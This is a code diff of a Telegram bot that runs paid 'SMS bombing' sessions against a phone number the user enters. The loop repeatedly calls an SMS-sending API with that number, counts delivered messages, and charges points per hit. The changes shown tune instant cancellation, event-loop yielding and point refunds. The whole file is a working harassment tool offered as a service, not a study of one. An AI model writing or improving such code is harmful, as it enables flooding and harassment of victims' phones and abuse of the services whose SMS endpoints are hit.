@@ -205,7 +205,7 @@ def check_vip_status(tg_user):
     return u.get("is_vip", False)
 
 temp_data = {}
-active_bombing_tasks = {} # Dedicated tracker for active bombing sessions (Fixes Cancel Bug)
+active_bombing_tasks = {} # Dedicated thread-safe tracker for active bombing
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -245,7 +245,6 @@ async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not user: return
     u = get_user_data(user)
     
-    # Safe temp cleanup without destroying active bombing tasks
     if user.id in temp_data: del temp_data[user.id]
     
     is_vip = check_vip_status(user)
@@ -337,17 +336,16 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             await send_join_prompt(update, unjoined, is_error=True)
 
-    # 🛑 ULTRA FAST INSTANT CANCEL BUTTON HANDLER
+    # 🛑 INSTANT CANCEL BUTTON HANDLER
     elif query.data.startswith('cancel_bombing_'):
         target_uid = int(query.data.split('_')[2])
         if user_id == target_uid or is_admin(user_id):
-            # Mark active task as cancelled instantly
             if target_uid in active_bombing_tasks:
                 active_bombing_tasks[target_uid]['cancel'] = True
             if target_uid in temp_data:
                 temp_data[target_uid]['cancel'] = True
                 
-            try: await query.answer("🛑 বোম্বিং সাথে সাথে বাতিল করা হয়েছে!", show_alert=True)
+            try: await query.answer("🔴 বোম্বিং সাথে সাথে বাতিল করা হয়েছে!", show_alert=True)
             except Exception: pass
         else:
             try: await query.answer("❌ আপনি এই বোম্বিং বাতিল করতে পারবেন না!", show_alert=True)
@@ -766,7 +764,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"✅ নম্বর সেট: <code>{num}</code>\n\n💥 কত বার (হিট) বোম্বিং করবেন?\n{limit_info}", parse_mode="HTML", reply_markup=get_back_keyboard())
         return
 
-    # ===== BOMBING LOOP WITH FAST CANCEL & EXACT COUNTS =====
+    # ===== BOMBING LOOP WITH FAST CANCEL & EXACT bot3.py SMS COUNTS =====
     elif step == 'awaiting_amount':
         try:
             amount = int(message)
@@ -807,12 +805,15 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             spinners = ["⏳", "⌛", "⚡", "💥"]
             
             for i in range(amount):
+                # Yield to Event Loop so Telegram Button Clicks are processed instantly!
+                await asyncio.sleep(0.05)
+                
                 # 🎯 Pre-Hit Cancel Check
                 if active_bombing_tasks.get(user_id, {}).get('cancel', False):
                     break
 
                 try:
-                    # 💥 Fast 4-Second Timeout API Call (Prevents Bot Hanging)
+                    # 💥 Fast Non-blocking API Call
                     api_response = await asyncio.to_thread(requests.get, f"{current_api}{number}", timeout=4)
                     
                     # 💥 EXACT SMS Counting Logic From bot 3.py
@@ -840,6 +841,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 
                 completed_hits += 1
                 
+                await asyncio.sleep(0.05)
+                
                 # 🎯 Post-Hit Cancel Check
                 if active_bombing_tasks.get(user_id, {}).get('cancel', False):
                     break
@@ -861,17 +864,20 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     )
                 except Exception: pass
                 
-                # Interruptible short delays for instant cancel handling
+                # Short interruptible sleep yielding control to button events
                 for _ in range(5):
                     if active_bombing_tasks.get(user_id, {}).get('cancel', False):
                         break
                     await asyncio.sleep(0.1)
 
-            # 🛑 Handle Cancellation Refund Execution
+            # Yield control to capture any last-millisecond button clicks
+            await asyncio.sleep(0.1)
+            
             is_cancelled = active_bombing_tasks.get(user_id, {}).get('cancel', False)
             if user_id in active_bombing_tasks:
                 del active_bombing_tasks[user_id]
 
+            # 🛑 Handle Cancellation Refund Execution
             if is_cancelled:
                 unexecuted_hits = amount - completed_hits
                 refund_points = 0 if is_vip else unexecuted_hits * POINT_PER_HIT
